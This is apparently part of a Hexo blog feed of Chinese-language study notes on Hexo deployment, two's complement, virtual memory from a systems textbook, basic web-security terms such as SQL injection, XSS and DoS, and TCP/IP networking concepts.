href="#在github上新建一个仓库。" class="headerlink" title="在github上新建一个仓库。"></a>在github上新建一个仓库。</h3><p>名称为，以我自己的为例：</p><pre><code class="hljs">zKurisu.github.io</code></pre><h3 id="安装git插件："><a href="#安装git插件：" class="headerlink" title="安装git插件："></a>安装git插件：</h3><pre><code class="hljs">cnpm install --save hexo-deployer-git</code></pre><h3 id="配置-config-yml文件添加："><a href="#配置-config-yml文件添加：" class="headerlink" title="配置_config.yml文件添加："></a>配置<code>_config.yml</code>文件添加：</h3><pre><code class="hljs">type: gitrepo: github上的仓库branch: master</code></pre><h3 id="部署到远端："><a href="#部署到远端：" class="headerlink" title="部署到远端："></a>部署到远端：</h3><pre><code class="hljs">sudo hexo deploy</code></pre><p><code>deploy</code>可简写为<code>d</code>.</p><p>这时就可以用GitHub来访问了。</p><h2 id="自定义主题"><a href="#自定义主题" class="headerlink" title="自定义主题"></a>自定义主题</h2><p>github上的仓库</p><pre><code class="hljs">http://github.com/litten/hexo-theme-yilia</code></pre><p>克隆到blog目录中：</p><pre><code class="hljs">sudo git clone ...</code></pre><p>然后配置到博客中。<br>修改<code>_config.yml</code>文件中的Themes。</p><h2 id="阅读官方文档"><a href="#阅读官方文档" class="headerlink" title="阅读官方文档"></a>阅读官方文档</h2><hr><p><a href="https://hexo.io/docs/">官方文档</a></p><hr><h3 id="hexo会忽略-开头的文件"><a href="#hexo会忽略-开头的文件" class="headerlink" title="hexo会忽略_开头的文件"></a>hexo会忽略_开头的文件</h3><p>除了<code>_posts</code>.</p><hr><h3 id="public文件"><a href="#public文件" class="headerlink" title="public文件"></a>public文件</h3><p>存放被渲染后的HTML和Markdown文件和一些其他复制来的文件。</p><hr><h2 id="Hexo-Theme-Fluid"><a href="#Hexo-Theme-Fluid" class="headerlink" title="Hexo Theme Fluid"></a>Hexo Theme Fluid</h2><p><a href="https://hexo.fluid-dev.com/links/">官方手册</a></p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>原码、反码、补码的产生</title>
    <link href="/2022/08/25/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%E7%9A%84%E4%BA%A7%E7%94%9F/"/>
    <url>/2022/08/25/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%E7%9A%84%E4%BA%A7%E7%94%9F/</url>
    
    <content type="html"><![CDATA[<hr><p><a href="https://www.zhihu.com/question/352057791/answer/876413629">参考知乎</a></p><hr><h2 id="获得补码的方法"><a href="#获得补码的方法" class="headerlink" title="获得补码的方法"></a>获得补码的方法</h2><p>取反加一。</p><h2 id="补码由来"><a href="#补码由来" class="headerlink" title="补码由来"></a>补码由来</h2><p>补码真正名称叫“Two’s complement”.</p><p>反码的名称叫“Ones’complement”.</p><p>原码叫“Sign-Magnitude”.</p><h3 id="Ones’complement"><a href="#Ones’complement" class="headerlink" title="Ones’complement"></a>Ones’complement</h3><p>这里是1的补集的意思。</p><p>原始计算方式：</p><blockquote><p>-x &#x3D; [1111…1] - x<br>例如：<br>-1 &#x3D; 111111111 - 00000001 &#x3D; 11111110</p></blockquote><p>看起来像是取反的操作。</p><h3 id="Two’s-complement"><a href="#Two’s-complement" class="headerlink" title="Two’s complement"></a>Two’s complement</h3><p>原始的计算方式:</p><blockquote><p>-x &#x3D; 2^w - x<br>这里w表示x有多少位。</p></blockquote><p>这里的Two就是式子里的2.</p><h4 id="补码的优势"><a href="#补码的优势" class="headerlink" title="补码的优势"></a>补码的优势</h4><p>无论是加法运算还是减法运算都是加法运算。</p><p>表示减法运算时，式子中一个是补码，一个是原码。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统</title>
    <link href="/2022/08/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/08/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a>深入理解计算机系统</h1><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>数据对象来自其他存储结构。</p><h2 id="命中与不命中"><a href="#命中与不命中" class="headerlink" title="命中与不命中"></a>命中与不命中</h2><p>就是缓存的数据中没有所需要的</p><h2 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h2><p>虚拟地址空间大小为2的N次方，N为位数。<br>其由cpu发出，经mmu(memory management unit)翻译，然后到主存中取数据。</p><p>一个对象有一个物理地址和一个虚拟地址。<br>分割为虚拟页。</p><p>页表在物理地址中，页表中有页表条目pte，其含有效位。</p><p>cpu引用换存在主存中的虚拟页时，会查看页表中的有效位，进而判断是否缺页。</p><h2 id="文件只读的作用"><a href="#文件只读的作用" class="headerlink" title="文件只读的作用"></a>文件只读的作用</h2><p>保护文件不被修改。</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>堆栈空间会有预留部分。</p><p>ebp寄存器和esp寄存器划分区域。</p><p>返回值一般在eax和edx中。编写程序尽量不返回大于4字节的数据。</p><p>栈上的数据在函数返回时会被释放掉。</p><p>堆的空闲链表分配法。</p><h2 id="虚拟存储器理解"><a href="#虚拟存储器理解" class="headerlink" title="虚拟存储器理解"></a>虚拟存储器理解</h2><p>为了使分布在磁盘上不同地址的数据，使用同一块地址空间，即主存。</p><p>使用虚拟存储器，进程不会与物理内存接触。</p><p>每一页的首地址为页表条目？</p><p>页表，PTE，物理存储器位于主存中。<br>虚拟页在磁盘中。</p><p>好处：</p><ul><li>共享问题，多个进程可映射同一个地址。</li><li>PTE可标记SUP,READ,WRITE位。违反此类常见报错“segment fault”</li></ul><p>PTE中含有物理页的起始位置，物理页中缓存有虚拟页。因此，虚拟页的位置就是物理页的起始位置+虚拟页面的偏移位置PPO。</p><p>物理页一般大于虚拟页，毕竟要缓存虚拟页。</p><p>虚拟页偏移量VPO等于物理页偏移量PPO。</p><p>物理内存(这里指磁盘上的内存)+交换内存(这里指主存)&#x3D;虚拟内存<br>但是虚拟存储器在磁盘上，物理存储器在主存上。</p><ul><li>虚拟内存就是磁盘上的存储空间被当作内存使用，磁盘不属于内存，所以是虚拟内存。</li><li>实际内存—-物理内存，虚拟内存—-磁盘上的空间。</li><li>置换(swap),把内存上的内容和磁盘上的虚拟内存中的内容进行部分交换。</li><li>动态链接库—-实现文件共享。</li><li>32位系统对应4G进程，64位系统对应8G进程。</li></ul><h2 id="虚拟内存的实现"><a href="#虚拟内存的实现" class="headerlink" title="虚拟内存的实现"></a>虚拟内存的实现</h2><p>由物理内存和磁盘上的交换空间组成虚拟内存。</p><p>只要Linux系统在运行，交换就一直在进行。</p><h2 id="虚拟内存再理解"><a href="#虚拟内存再理解" class="headerlink" title="虚拟内存再理解"></a>虚拟内存再理解</h2><p>虚拟页缓存在物理页中，若不命中，则发生页牺牲，替换进需要的虚拟页，命中发生时，cpu发出虚拟地址，经mmu地址翻译后为物理地址，这个物理地址是物理页的地址。</p><p>每一个进程都会被分配大小一定的虚拟内存，但实际消耗的大小不同。</p><p>虚拟页一般很大，4KB～2MB。</p><p>页表存储地址翻译的信息，页表是页表条目的数组，虚拟空间中的每个页都有一个页表条目。<br>从这里可以看出，cpu要找一个虚拟页，就得查看页表中的页表条目。PTE表明了是哪个虚拟页，缓存在哪个物理页及物理页的位置。<br>PTE中的地址字段有三种情况：</p><blockquote><ol><li>物理页的起始地址(有效位被设置)</li><li>空白(有效位没被设置，虚拟页未分配)</li><li>虚拟页的起始位置(有效位没被设置)</li></ol></blockquote><p><em>总的说</em>，程序都会从磁盘输送到主存中。<br>每个进程有单独的页表。</p><h3 id="虚拟地址的组成"><a href="#虚拟地址的组成" class="headerlink" title="虚拟地址的组成"></a>虚拟地址的组成</h3><p>虚拟地址偏移量vpo和虚拟页表号vpn。页面大小决定偏移量大小。<br>物理地址同样包含ppo和ppn。</p><h2 id="使用虚拟地址的好处"><a href="#使用虚拟地址的好处" class="headerlink" title="使用虚拟地址的好处"></a>使用虚拟地址的好处</h2><p>简化内存管理，提供自然的保护内存的方法。</p><h2 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h2><p>用于压缩页表，一级页表是最内层的页表</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>磁盘上的程序，当被系统执行时，被加载进内存，然后放入寄存器，最后让cpu执行，就变成了进程<br>progress。也就是运行中的程序。</p><ul><li>进程运行时，会得到4G的虚拟内存，最高的一个G为内核内存，剩下三个G为用户内存。</li></ul><h2 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h2><p>把一个地址连接到另一个地址。如，内存单元A的地址为X，把它映射到地址Y，这样访问Y时，就可以访问到A了。</p>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>白帽子讲 Web 安全</title>
    <link href="/2022/08/25/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20Web%20%E5%AE%89%E5%85%A8/"/>
    <url>/2022/08/25/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20Web%20%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<hr><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL Injection。<br>把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p><p>这个注入，就是插入代码的意思。</p><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><hr><p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065">参考百科</a></p><hr><p>Cross Site Scripting, 跨站脚本攻击，缩写为CSS.</p><p>但容易与层叠样式表Cascading Style Sheets, CSS，混淆于是缩写为XSS。</p><p>其原理是利用网页开发时留下的漏洞，注入恶意指令代码到网页，使用户加载并执行。</p><h2 id="安全本质"><a href="#安全本质" class="headerlink" title="安全本质"></a>安全本质</h2><p>安全检查，信任域，信任边界。</p><p>安全的本质是信任的问题。</p><p>对条件的信任程度，是确定对象是否安全的基础。</p><h3 id="银弹"><a href="#银弹" class="headerlink" title="银弹"></a>银弹</h3><p>只能用银弹(银质子弹)才能消灭狼人。</p><h3 id="0day漏洞"><a href="#0day漏洞" class="headerlink" title="0day漏洞"></a>0day漏洞</h3><p>指那些没有被公开过，因而也没有补丁的漏洞。</p><p>早期表示在软件发行后24小时内就出现破解版本。</p><p>现在的引申含义，只要是在软件或者其他东西发布后，在最短时间内出现相关破解的，都可以叫0day。</p><h3 id="Pwn2own"><a href="#Pwn2own" class="headerlink" title="Pwn2own"></a>Pwn2own</h3><hr><p><a href="https://baike.baidu.com/item/pwn2own/4242990">参考百科</a></p><hr><p>Pwn2own是全世界最著名、奖金最丰厚的黑客大赛。</p><h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><p>CIA, Confidentiality Integrity Availability. 机密性， 完整性， 可用性。</p><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><p>Denial of Service, 拒绝服务攻击。破坏安全的可用性。</p><p>一种远程攻击的形式。</p><p>是一种常用来使服务器或网络瘫痪的网络攻击手段。</p><p>DDoS, Distributed Denial Service, 分布式拒绝服务攻击，或称洪水攻击。</p><p>其利用网络上已被攻陷的电脑作为“僵尸”，向某一特定的目标电脑发动密集式的“拒绝服务”要求，用以把目标电脑的网络资源及系统资源耗尽，使之无法向真正正常请求的用户提供服务。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>图解 TCPIP.md</title>
    <link href="/2022/08/25/%E5%9B%BE%E8%A7%A3%20TCPIP/"/>
    <url>/2022/08/25/%E5%9B%BE%E8%A7%A3%20TCPIP/</url>
    
    <content type="html"><![CDATA[<h2 id="5-3-ARP"><a href="#5-3-ARP" class="headerlink" title="5.3 ARP"></a>5.3 ARP</h2><h3 id="5-3-1-ARP-概要"><a href="#5-3-1-ARP-概要" class="headerlink" title="5.3.1 ARP 概要"></a>5.3.1 ARP 概要</h3><p>以目标 IP 地址为线索, 用来定位下一个应该接收数据分包的网络设备对应的 MAC 地址.</p><p>ARP 只适用于 IPv4, 不能用于 IPv6. IPv6 中可以用 ICMPv6 替代 ARP 发送邻居探索消息.</p><h3 id="5-3-2-ARP-的工作机制"><a href="#5-3-2-ARP-的工作机制" class="headerlink" title="5.3.2 ARP 的工作机制"></a>5.3.2 ARP 的工作机制</h3><p>ARP 借助:</p><ul><li>ARP 请求 (请求获取 MAC 地址)</li><li>ARP 响应 (返回 MAC 地址)<br>两种类型的包确定 MAC 地址.</li></ul><p>通过广播发送 ARP 请求包, 这个包中包含了想要了解其 MAC 地址的主机 IP 地址.</p><p>ARP 请求包还有一个作用就是将自己的 MAC 地址告诉给对方.</p><p>通常获取到的 MAC 地址会缓存一段时间. 以映射关系存储在 ARP 缓存表.</p><h3 id="5-3-3-IP-地址和-MAC-地址缺一不可"><a href="#5-3-3-IP-地址和-MAC-地址缺一不可" class="headerlink" title="5.3.3 IP 地址和 MAC 地址缺一不可?"></a>5.3.3 IP 地址和 MAC 地址缺一不可?</h3><h2 id="5-4-ICMP-Internet-Control-Message-Protocol"><a href="#5-4-ICMP-Internet-Control-Message-Protocol" class="headerlink" title="5.4 ICMP (Internet Control Message Protocol)"></a>5.4 ICMP (Internet Control Message Protocol)</h2><h3 id="5-3-4-RARP-Reverse-Address-Resolution-Protocol"><a href="#5-3-4-RARP-Reverse-Address-Resolution-Protocol" class="headerlink" title="5.3.4 RARP (Reverse Address Resolution Protocol)"></a>5.3.4 RARP (Reverse Address Resolution Protocol)</h3><p>从 MAC 地址定位 IP 地址的一种协议.</p><h3 id="5-4-1-辅助-IP-的-ICMP"><a href="#5-4-1-辅助-IP-的-ICMP" class="headerlink" title="5.4.1 辅助 IP 的 ICMP"></a>5.4.1 辅助 IP 的 ICMP</h3><p>ICMP 的主要功能包括, 确认 IP 包是否成功送达目标地址, 通知在发送过程当中 IP 包被废弃的具体原因, 改善网络设置等.</p><p>ICMP 的通知消息会使用 IP 进行发送.</p><p>ICMP 的消息大致可以分为两类:</p><ul><li>一类是通知出错原因的错误消息</li><li>另一类是用于诊断的查询消息</li></ul><h3 id="5-4-2-主要的-ICMP-消息"><a href="#5-4-2-主要的-ICMP-消息" class="headerlink" title="5.4.2 主要的 ICMP 消息"></a>5.4.2 主要的 ICMP 消息</h3><p>IP 路由器无法将 IP 数据包发送给目标地址时, 会给发送端主机返回一个目标不可达 (Destination Unreachable Message) 的 ICMP 的信息, 并在这个消息中显示不可达的具体原因.</p><h4 id="ICMP-重定向消息"><a href="#ICMP-重定向消息" class="headerlink" title="ICMP 重定向消息"></a>ICMP 重定向消息</h4><p>返回更合适的路由信息.</p><h4 id="ICMP-超时信息"><a href="#ICMP-超时信息" class="headerlink" title="ICMP 超时信息"></a>ICMP 超时信息</h4><p>TTL (Time To Live) 的值减到 0 时 IP 包会被丢弃.</p><p>此时, IP 路由器将会发送一个 ICMP 超时的消息给发送端主机,并通知该包已被丢弃.</p><p>设置 TTL 可以避免循环. 有时可用于控制包的到达范围 .</p><p><code>traceroute</code> 命令, 可以显示出由执行程序的主机到达特定主机之间历经多少路由器. 原理就是利用 IP 包的生存期限从 1 开始按照顺序递增的同时发送 UDP 包.</p><p>使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ traceroute 目标主机地址<br></code></pre></td></tr></table></figure><h4 id="ICMP-回送消息"><a href="#ICMP-回送消息" class="headerlink" title="ICMP 回送消息"></a>ICMP 回送消息</h4><p><code>ping</code> 命令依靠此消息实现. 判断所发送的数据包是否已经成功到达对端的一种消息.</p><h2 id="对协议的理解"><a href="#对协议的理解" class="headerlink" title="对协议的理解"></a>对协议的理解</h2><p>协议是信息传递的规范，只有两台计算机使用相同的协议进行交流，数据才能够被传达。</p><h2 id="分组交换协议"><a href="#分组交换协议" class="headerlink" title="分组交换协议"></a>分组交换协议</h2><p>数据被拆分为包，包上有报文首部，含有原主机地址，目的主机地址等信息。</p><h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2><p>每个分层接受它的下一层提供的服务并向它自己的上一层提供服务。就是底层向上层服务。</p><p>便于区分功能。</p><p>层与层之间有接口，同层之间有协议。</p><p>通过OSI参考模型，可以得知每一层大致的作用。</p><p>OSI各层的作用：</p><ul><li>应用层，确定数据内容，发送者，目的地址</li><li>表示层，用于数据的主机特有格式和网络统一格式的转换。即格式化编码。</li><li>会话层，确定主机间的连接方式，建立几次连接之类。即标记发送顺序。管理何时建立连接，何时发送数据。</li><li>传输层，进行实际上连接的建立和断开。确保数据传送至目的地，没有到达则重发。<em><strong>可能这里就是一次握手发生的地方。</strong></em>所以传输层的作用是确保通信的可靠性。逻辑上的连接。</li><li>网络层，负责将数据发送至最终目标地址。</li><li>数据链路层，负责传输介质设备之间的数据处理。物理上的连接</li><li>物理层，将数据的0，1转换为电压和脉冲光传送给物理的传输介质。</li></ul><p>MAC地址(media access control介质访问控制)，即物理地址、硬件地址。</p><h3 id="对各层作用的理解"><a href="#对各层作用的理解" class="headerlink" title="对各层作用的理解"></a>对各层作用的理解</h3><p>可能是每一层将自己的工作成果标记在表头报文中，然后接收方一一解析这些报文。</p><h2 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h2><p>两种：</p><blockquote><ul><li>面向连接</li><li>面向无连接</li></ul></blockquote><p>分组交换，每个包上标记有发送端和接受端的地址。</p><p>传输速率又称<strong>宽带</strong><br>主机之间实际的传输速率称为吞吐量<br>物理设备的兼容性很重要。<br>计算机与外界连接的接口称作端口。</p><h2 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h2><h3 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h3><p>用于接入网络。</p><h3 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h3><p>位于OSI模型的物理层。<br>对电信号或光信号进行波形调整和放大。<br>用于延长网络。<br>信号在传输的过程中会减弱，中继器就是把信号调整正常和加强。</p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>多口中继器。</p><h3 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h3><p>位于OSI模型的第二层，数据链路层。可存储数据帧，连接网段。可学习。<br>又称2层交换机。<br>具有网桥功能的Hub叫做交换集线器，只有中继器功能的Hub叫集线器。</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>位于OSI模型的第三层，网络层，可以连接不同的数据链路。<br>网桥是根据MAC地址进行处理，路由器是根据IP地址进行处理。</p><h3 id="4～7层交换机"><a href="#4～7层交换机" class="headerlink" title="4～7层交换机"></a>4～7层交换机</h3><p>处理传输层以上。其包含负载均衡器。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>交换机内部有一张MAC地址表，记录每一个MAC地址的设备，连接在其哪一个端口。</p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p>协议的转换与数据的收发。</p><h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><p>通过交换机小范围传输数据的网络。</p><h2 id="网络流量"><a href="#网络流量" class="headerlink" title="网络流量"></a>网络流量</h2><p>网络上传输的数据报文的数量。</p><h2 id="云"><a href="#云" class="headerlink" title="云"></a>云</h2><p>动态调整。</p><h3 id="客户端-x2F-服务端模型"><a href="#客户端-x2F-服务端模型" class="headerlink" title="客户端&#x2F;服务端模型"></a>客户端&#x2F;服务端模型</h3><h1 id="来自知乎上一个回答的理解"><a href="#来自知乎上一个回答的理解" class="headerlink" title="来自知乎上一个回答的理解"></a>来自知乎上一个回答的理解</h1><p>路由器的每一个端口，都有独立的MAC地址。</p><h2 id="自我理解"><a href="#自我理解" class="headerlink" title="自我理解"></a>自我理解</h2><p>集线器集主机的线，交换机是高级的集线器，路由器集交换机的线。</p><h2 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h2><p>一般48位，前24位代表网络硬件制造商的编号，后24位是厂家自己分配的，一般表示系列号。</p><p>通过IP号可以实现向一个区域内的主机发送数据。</p><p>报文首部由几个头部组成，比如网络层头部，数据链路层头部。</p><h2 id="IP地址作用"><a href="#IP地址作用" class="headerlink" title="IP地址作用"></a>IP地址作用</h2><p>便于将信息发送给一群设备。<br>IP地址可以随时修改。</p><h2 id="子网的作用"><a href="#子网的作用" class="headerlink" title="子网的作用"></a>子网的作用</h2><p>如果源IP与目标IP处于一个子网，直接将包通过交换机发出。<br>如果源IP与目标IP不处于一个子网，则交给路由器处理。<br>子网号就是IP地址中的网络号。<br>子网掩码用于判断IP地址中那一部分表示子网，即网络号，那一部分表示主机号。<br>网络号是多个主机共有的、相同的。</p><h2 id="默认网关"><a href="#默认网关" class="headerlink" title="默认网关"></a>默认网关</h2><p>默认网关也是一个IP地址。<br>在主机发送给不同子网的主机时，就发送给默认网关。</p><p>所以说，路由器在交换机面前就是一个有IP地址、MAC地址的一个主机。</p><p>路由器中有路由表，记录子网号。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>通过IP地址，找到MAC地址。电脑中有ARP缓存表。<br>数据信息最终是通过MAC地址到达。</p><h2 id="数据传输的过程"><a href="#数据传输的过程" class="headerlink" title="数据传输的过程"></a>数据传输的过程</h2><p>过程中，数据包中IP地址不变，MAC地址在变化。<br>数据链路层记录MAC地址，网络层记录IP地址。<br>交换机只处理MAC地址。</p><p>路由器路由表中，若匹配上了吓一跳，即是发给下一个路由器。<br>发给交换机的数据中，必须包含MAC地址。</p><h1 id="最终梳理，部分知识点"><a href="#最终梳理，部分知识点" class="headerlink" title="最终梳理，部分知识点"></a>最终梳理，部分知识点</h1><p>含有APR表的为主机和路由器，APR表记录IP地址和MAC地址的对应关系。<br>交换机中有MAC地址表，能够学习，记录MAC地址和端口的对应关系。<br>路由器中还有路由表，记录子网和端口的关系，通过下一跳表项决定是否传给下一个路由器。</p><h2 id="数据包首部"><a href="#数据包首部" class="headerlink" title="数据包首部"></a>数据包首部</h2><p>每个分层，都会对所发送的数据附加一个首部。<br>数据包都是由两部分组成，一部分是首部，一部分是数据。</p><p>每个包首部都至少包含两个信息：</p><ul><li>发送端和接受端的地址。</li><li>上一层的协议类型。</li></ul><p>每个分层包首部中还包含一个识别位，用来表示上一层协议的种类信息。</p><p>每一种协议对应一种处理程序。</p><h2 id="以太网-1"><a href="#以太网-1" class="headerlink" title="以太网"></a>以太网</h2><p>Ethernet一词源于Ether(以太)，意为介质。<br>以太网的发展可以看成电缆的改变。</p><h3 id="以太帧"><a href="#以太帧" class="headerlink" title="以太帧"></a>以太帧</h3><p>前端有八个字节的前导码，本体首部十四个字节，帧尾有FCS，四个字节，检验帧是否损坏，通过计算余数。</p><h2 id="Wi-Fi"><a href="#Wi-Fi" class="headerlink" title="Wi-Fi"></a>Wi-Fi</h2><p>Wireless Fidelity，指高质量的无限LAN。</p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>Virtual Private Network虚拟专用网络。</p><h2 id="数据链路"><a href="#数据链路" class="headerlink" title="数据链路"></a>数据链路</h2><p>就是数据传输方式，如以太网、无线等，对应不同的通信媒介。</p><h2 id="网络层与数据链路层的关系"><a href="#网络层与数据链路层的关系" class="headerlink" title="网络层与数据链路层的关系"></a>网络层与数据链路层的关系</h2><p>数据链路层负责直连的两个设备之间的通信，网络层负责没有直连的两个网络之间的通信。</p><p>不同网络区间的数据传递称跳hop，下一跳，即指定下一个路由器或主机的位置。IP地址，比MAC地址更易组织。<br>不同数据链路—-不同介质—-不同传输速率。</p><p>IP面向无连接，简单、高速化。<br>IP负责发送，TCP负责保证主机确实收到数据。<br>同一网段，即IP地址中的网络号相同。</p><h1 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h1><p>ABCD四类地址对应多种功能。<br>有了子网掩码以后，就没有ABCD的IP地址分类了。</p><p>数据链路不同，对应的MTU(最大传输单元)不同，因为其传输用途不同。</p><p>面对网络过滤是否可模拟参数。</p><p>分片的坏处，一块碎片丢失会导致整个数据作废.</p><p>TTL(Time To Live)生存周期。</p><h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><p>解决了移动通信时的IP分配问题。<br>避免重复分配，发送ICMP回送请求包。</p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>Network Address Translator,解决IPv4地址枯竭问题，以及IPv6的安全问题。<br>私有IP地址和全局IP地址的转换。<br>NAT-PT(Protocol Translation)</p><p>IP任播，指为提供同一种服务的服务器配置同一个IP地址。</p><p>路由器有对某些包优先处理的方式。</p><h2 id="包中的各个标记"><a href="#包中的各个标记" class="headerlink" title="包中的各个标记"></a>包中的各个标记</h2><p>每一层的标识，上一层的标识。</p><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>服务端的程序。<br>通过目的端口号可以识别数据包发送给哪一个守护进程。</p><h2 id="流"><a href="#流" class="headerlink" title="流"></a>流</h2><p>指不间断的数据结构，可以想象成排水管道中的水流。</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>使用TCP时，发送端的信息中含有数据段的长度信息。</p><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>User Datagram Protocol,用户数据报协议。</p><p>TCP的特征：</p><ul><li>面向连接</li><li>具备顺序控制、重发机制等机制</li></ul><p>UDP的适用区：<br>高速传输和实时性较高要求的通信或广播通信。</p><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>即套接字。套接，是建立网络通讯和进程间通讯，字，是可交互的有序指令串。</p><p>socket原意是物理上的插座，电器的插头插上插座就会从电网获取电力供应，这里可为逻辑上的，比如web和浏览器可视为socket。</p><p>socket可能用于创建连接。</p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>fd，file descriptor, 为了表示和区分已经打开的文件，UNIX&#x2F;Linux给每个文件分配的ID，通常：</p><ul><li>用0表示标准输入文件(stdin)，对应硬件设备的键盘</li><li>用1表示标准输出文件(stdout),对应硬件设备的显示器</li><li>用2表示标准错误输出文件(stderr)</li></ul><p>系统创建的每一个进程都会默认打开这三个文件。</p><p>UNIX&#x2F;Linux执行的任何I&#x2F;O操作都是在读取或写入文件描述符—-一个整数，关联一个打开的文件。</p><p>网络连接也是一个文件。</p><p>每个文件的文件描述符不是固定的。<br>文件描述符也不是递增的，其被回收后可被重新分配。</p><p>每个进程都维护一个文件描述符的集合。<br>新的文件描述符从3开始分配。</p><p>总结：<br>    1.文件描述符是一个整型<br>    2.每个进程默认打开0、1、2三个文件描述符，新的文件描述符都是从3开始分配<br>    3.一个文件描述符被回收后可以再次被分配<br>    4.每个进程单独维护一个文件描述符的集合 </p><h2 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h2><p>用于创建进程，其返回一个int值，当返回值为0时表明当前是子进程正在执行，非0就为父进程在执行。</p><h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><p>几个地址：</p><ul><li>MAC地址，对应数据链路层的地址</li><li>IP地址，对应网络层的地址</li><li>端口号，对应传输层的地址</li></ul><p>用于识别同一台计算机中进行通信的不同应用程序，因此，也叫程序地址。</p><p>TCP&#x2F;IP或UDP&#x2F;IP通信中采用的五个信息识别：</p><ul><li>源IP地址</li><li>目标IP地址</li><li>协议号</li><li>源端口号</li><li>目标端口号</li></ul><p>端口号可动态分配和静态分配。<br>不同的传输协议可以使用不同的端口号。</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>指各种设备、线路，或网络中进行通信的两个应用程序为了相互传递消息而专有的、虚拟的通信线路，也叫做虚拟电路。</p><h2 id="窗口控制和重发控制的理解"><a href="#窗口控制和重发控制的理解" class="headerlink" title="窗口控制和重发控制的理解"></a>窗口控制和重发控制的理解</h2><p>通过确认应答来决定重发哪一部分数据。比如窗口大小为400字节，一段为一百字节。</p><p>0~100字节发送后，还未收到确认应答，可继续发送。此时发送了101～200的字节。</p><p>这时，可能收到了0～100的确认应答，这个时候表明0～100字节的数据已到达。</p><p>若没收到0～100的确认应答，此时的原因有两种，一是数据丢失，而是确认应答丢失。</p><p>先说第一种，数据丢失后，由于发出了101～200的数据，也会产生一个确认应答，若这个确认应答成功返回，它会请求0～100的数据，然后0～100的数据就会重发。</p><p>第二种，确认应答丢失，通过对第二个确认应答的判断，若是请求201～300的数据，说明前两个数据段都已到达。</p><p>因此，窗口控制和重发控制的核心就是，通过后面的应答判断前面的传输情况。</p><h2 id="互联网的结构"><a href="#互联网的结构" 